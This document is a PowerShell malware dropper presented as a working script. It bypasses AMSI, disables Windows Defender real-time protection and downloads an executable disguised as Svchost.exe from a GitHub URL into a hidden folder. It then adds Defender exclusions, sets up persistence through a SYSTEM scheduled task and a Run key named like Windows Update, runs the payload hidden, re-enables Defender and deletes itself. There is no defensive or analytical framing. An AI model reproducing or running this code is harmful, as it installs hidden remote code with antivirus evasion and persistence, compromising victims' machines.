# ============================================
# WORKING SCRIPT - Registry Exclusions + Defender OFF/ON
# ============================================

# AMSI BYPASS
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# DEFENDER OFF
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# HIDDEN FOLDER
$HiddenFolder = "$env:ProgramData\Microsoft\Windows\Drivers"
if (!(Test-Path $HiddenFolder)) { New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null }
Set-ItemProperty -Path $HiddenFolder -Name Attributes -Value "Hidden, System"

$RandomName = [System.Guid]::NewGuid().ToString().Substring(0, 12) + ".exe"
$ExePath = Join-Path $HiddenFolder $RandomName

# DOWNLOAD EXE
$DownloadUrl = "https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$wc.DownloadFile($DownloadUrl, $ExePath)
Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"

# ============================================
# REGISTRY EXCLUSIONS (Using PowerShell MPPreference - No HKLM needed)
# ============================================
# Yeh Windows Defender ko directly add karta hai bina registry edit kiye
Add-MpPreference -ExclusionPath $HiddenFolder -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $RandomName -ErrorAction SilentlyContinue

# AUTO-START
$action = New-ScheduledTaskAction -Execute $ExePath
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -Compatibility Win8
$taskName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null

# Registry Run
$regRun = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
Set-ItemProperty -Path $regRun -Name $regName -Value $ExePath -Force

# START EXE
Start-Process -FilePath $ExePath -WindowStyle Hidden

# WAIT 25 SECONDS
Start-Sleep -Seconds 25

# DEFENDER BACK ON
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

# DELETE SCRIPT
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
